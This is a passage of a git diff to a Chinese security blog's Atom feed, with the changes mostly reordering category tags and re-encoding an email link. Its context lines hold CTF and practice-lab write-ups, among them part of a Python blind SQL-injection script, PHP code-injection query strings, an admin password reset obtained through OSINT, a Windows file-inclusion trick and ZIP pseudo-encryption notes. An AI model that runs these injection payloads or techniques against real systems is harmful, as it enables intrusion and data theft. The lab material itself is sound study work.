列长度&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; f &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;128&lt;/span&gt;):  &lt;span class=&#34;comment&#34;&gt;# 数据表单个字符的ascii值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                payload = &lt;span class=&#34;string&#34;&gt;&amp;quot;?id=1&amp;#x27; and (select ascii(substr((select &amp;quot;&lt;/span&gt;+zd+&lt;span class=&#34;string&#34;&gt;&amp;quot; from &amp;quot;&lt;/span&gt;+biao+&lt;span class=&#34;string&#34;&gt;&amp;quot; limit &amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(d) + &lt;span class=&#34;string&#34;&gt;&amp;quot;,1) ,&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(e) + &lt;span class=&#34;string&#34;&gt;&amp;quot;,1)) = &amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(f) + &lt;span class=&#34;string&#34;&gt;&amp;quot;) --+&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;all&lt;/span&gt; = &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(url) + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                res = requests.get(&lt;span class=&#34;built_in&#34;&gt;all&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                text = res.text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                content = &lt;span class=&#34;string&#34;&gt;&amp;#x27;You are in&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                result = (text.find(content))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (result != -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    value = value + &lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(f)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;第&amp;quot;&lt;/span&gt; + &lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(d + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + &lt;span class=&#34;string&#34;&gt;&amp;quot;个值是:&amp;quot;&lt;/span&gt; + value)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 </content>
-        <category term="靶场练习" />
         <category term="web安全" />
+        <category term="靶场练习" />
         <updated>2021-07-30T10:01:25.403Z</updated>
     </entry>
     <entry>
@@ -436,7 +484,7 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;42986bfd-0cba-43c6-9be4-1a319be86d20&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 &lt;h1 id=&#34;web15&#34;&gt;&lt;a href=&#34;#web15&#34; class=&#34;headerlink&#34; title=&#34;web15&#34;&gt;&lt;/a&gt;web15&lt;/h1&gt;&lt;p&gt;公开的信息比如邮箱，可能造成信息泄露，产生严重后果&lt;/p&gt;
-&lt;p&gt;可以看到有一个邮箱&lt;a href=&#34;mailto:&amp;#x31;&amp;#49;&amp;#x35;&amp;#54;&amp;#x36;&amp;#x33;&amp;#x31;&amp;#x39;&amp;#54;&amp;#49;&amp;#64;&amp;#x71;&amp;#x71;&amp;#x2e;&amp;#x63;&amp;#111;&amp;#109;&#34;&gt;&amp;#x31;&amp;#49;&amp;#x35;&amp;#54;&amp;#x36;&amp;#x33;&amp;#x31;&amp;#x39;&amp;#54;&amp;#49;&amp;#64;&amp;#x71;&amp;#x71;&amp;#x2e;&amp;#x63;&amp;#111;&amp;#109;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;可以看到有一个邮箱&lt;a href=&#34;mailto:&amp;#49;&amp;#x31;&amp;#x35;&amp;#x36;&amp;#x36;&amp;#51;&amp;#x31;&amp;#x39;&amp;#54;&amp;#x31;&amp;#64;&amp;#x71;&amp;#x71;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#x6d;&#34;&gt;&amp;#49;&amp;#x31;&amp;#x35;&amp;#x36;&amp;#x36;&amp;#51;&amp;#x31;&amp;#x39;&amp;#54;&amp;#x31;&amp;#64;&amp;#x71;&amp;#x71;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#x6d;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;访问admin页面，admin作为账号 ，邮箱作为密码，发现不对&lt;/p&gt;
 &lt;p&gt;点忘记密码让我们填密保问题所在地  我们查一下这个qq，发现qq的资料显示在西安   之后密码被重置为admin7789，登陆即可&lt;/p&gt;
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ctfshow&amp;#123;dd71f776-6d6a-4cde-9106-f8db89f56b8d&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
@@ -806,9 +854,9 @@
 &lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?v1=1&amp;amp;v2=var_dump($ctfshow)/*&amp;amp;v3=*/;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?v1=1&amp;amp;v2=var_dump($ctfshow)&amp;amp;v3=;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 
 </content>
-        <category term="CTF" />
-        <category term="靶场练习" />
         <category term="web安全" />
+        <category term="靶场练习" />
+        <category term="CTF" />
         <updated>2021-07-23T09:39:00.596Z</updated>
     </entry>
     <entry>
@@ -953,9 +1001,9 @@
 &lt;p&gt;压缩源文件目录区：&lt;br&gt;50 4B 01 02：目录中文件文件头标记(0x02014b50)&lt;br&gt;3F 00：压缩使用的 pkware 版本&lt;br&gt;14 00：解压文件所需 pkware 版本&lt;br&gt;00 00：全局方式位标记（有无加密的重要标志，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）&lt;br&gt;08 00：压缩方式&lt;br&gt;5A 7E：最后修改文件时间&lt;br&gt;F7 46：最后修改文件日期&lt;br&gt;16 B5 80 14：CRC-32校验（1480B516）&lt;br&gt;19 00 00 00：压缩后尺寸（25）&lt;br&gt;17 00 00 00：未压缩尺寸（23）&lt;br&gt;07 00：文件名长度&lt;br&gt;24 00：扩展字段长度&lt;br&gt;00 00：文件注释长度&lt;br&gt;00 00：磁盘开始号&lt;br&gt;00 00：内部文件属性&lt;br&gt;20 00 00 00：外部文件属性&lt;br&gt;00 00 00 00：局部头部偏移量&lt;br&gt;6B65792E7478740A00200000000000010018006558F04A1CC5D001BDEBDD3B1CC5D001BDEBDD3B1CC5D001&lt;/p&gt;
 &lt;p&gt;压缩源文件目录结束标志：&lt;br&gt;50 4B 05 06：目录结束标记&lt;br&gt;00 00：当前磁盘编号&lt;br&gt;00 00：目录区开始磁盘编号&lt;br&gt;01 00：本磁盘上纪录总数&lt;br&gt;01 00：目录区中纪录总数&lt;br&gt;59 00 00 00：目录区尺寸大小&lt;br&gt;3E 00 00 00：目录区对第一张磁盘的偏移量&lt;br&gt;00 00：ZIP 文件注释长度&lt;br&gt;————————————————&lt;br&gt;以上内容转自CSDN，原文链接：&lt;a href=&#34;https://blog.csdn.net/weixin_41687289/article/details/82695801&#34;&gt;https://blog.csdn.net/weixin_41687289/article/details/82695801&lt;/a&gt;&lt;/p&gt;
 &lt;h2 id=&#34;REVERSE&#34;&gt;&lt;a href=&#34;#REVERSE&#34; class=&#34;headerlink&#34; title=&#34;REVERSE&#34;&gt;&lt;/a&gt;REVERSE&lt;/h2&gt;&lt;h2 id=&#34;CRYPTO&#34;&gt;&lt;a href=&#34;#CRYPTO&#34; class=&#34;headerlink&#34; title=&#34;CRYPTO&#34;&gt;&lt;/a&gt;CRYPTO&lt;/h2&gt;&lt;h2 id=&#34;PWN&#34;&gt;&lt;a href=&#34;#PWN&#34; class=&#34;headerlink&#34; title=&#34;PWN&#34;&gt;&lt;/a&gt;PWN&lt;/h2&gt;</content>
-        <category term="CTF" />
-        <category term="靶场练习" />
         <category term="web安全" />
+        <category term="靶场练习" />
+        <category term="CTF" />
         <updated>2021-07-22T04:01:41.978Z</updated>
     </entry>
     <entry>
@@ -1098,8 +1146,8 @@
 
 
 </content>
-        <category term="web安全" />
         <category term="渗透测试" />
+        <category term="web安全" />
         <category term="内网渗透" />
         <updated>2021-07-20T13:40:34.695Z</updated>
     </entry>
@@ -1146,9 +1194,9 @@
 
 &lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/192052.html&#34;&gt;无需sendmail：巧用LD_PRELOAD突破disable_functions&lt;/a&gt;&lt;/p&gt;
 </content>
-        <category term="CTF" />
-        <category term="靶场练习" />
         <category term="web安全" />
+        <category term="靶场练习" />
+        <category term="CTF" />
         <updated>2021-07-14T10:05:03.593Z</updated>
     </entry>
     <entry>
@@ -1234,8 +1282,8 @@
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/QQ%E5%9B%BE%E7%89%8720210707165558.png&#34; alt=&#34;QQ图片20210707165558&#34;&gt;&lt;/p&gt;
 &lt;p&gt;直接从例子里面可以看出来，传入file=5&amp;lt;参数就可以包含到了我们的596a62sd.php(这是随便取的)，大概原理根据windows的一些特性，我们输入的&amp;lt;会转换成&lt;em&gt;，而被转换的&lt;/em&gt;类似于linux中的通配符,所以这里就可以利用这个特性来用&amp;lt;进行文件包含。&lt;br&gt;具体解析可以看 &lt;a href=&#34;http://www.jinglingshu.org/?p=8790&#34;&gt;http://www.jinglingshu.org/?p=8790&lt;/a&gt; 这篇文章介绍的&lt;/p&gt;
 </content>
-        <category term="web安全" />
         <category term="渗透测试" />
+        <category term="web安全" />
         <category term="代码审计" />
         <updated>2021-07-07T08:38:24.358Z</updated>
     </entry>
@@ -1292,9 +1340,9 @@
 &lt;p&gt;本地测试可以成功上线&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/ZwqGG/image@main/img/image-20210724180335375.png&#34; alt=&#34;image-20210724180335375&#34;&gt;&lt;/p&gt;
 </content>
-        <category term="web安全" />
         <category term="免杀" />
         <category term="渗透测试" />
+        <category term="web安全" />
         <updated>2021-07-03T15:12:06.941Z</updated>
     </entry>
     <entry>
@@ -1450,8 +1498,8 @@
 
 
 &lt;h1 id=&#34;XXE&#34;&gt;&lt;a href=&#34;#XXE&#34; class=&#34;headerlink&#34; title=&#34;XXE&#34;&gt;&lt;/a&gt;XXE&lt;/h1&gt;&lt;h1 id=&#34;URL重定向&#34;&gt;&lt;a href=&#34;#URL重定向&#34; class=&#34;headerlink&#34; title=&#34;URL重定向&#34;&gt;&lt;/a&gt;URL重定向&lt;/h1&gt;&lt;h1 id=&#34;SSRF&#34;&gt;&lt;a href=&#34;#SSRF&#34; class=&#34;headerlink&#34; title=&#34;SSRF&#34;&gt;&lt;/a&gt;SSRF&lt;/h1&gt;</content>
-        <category term="靶场练习" />
         <category term="web安全" />
+        <category term="靶场练习" />
         <updated>2021-06-18T12:52:44.113Z</updated>
     </entry>
     <entry>
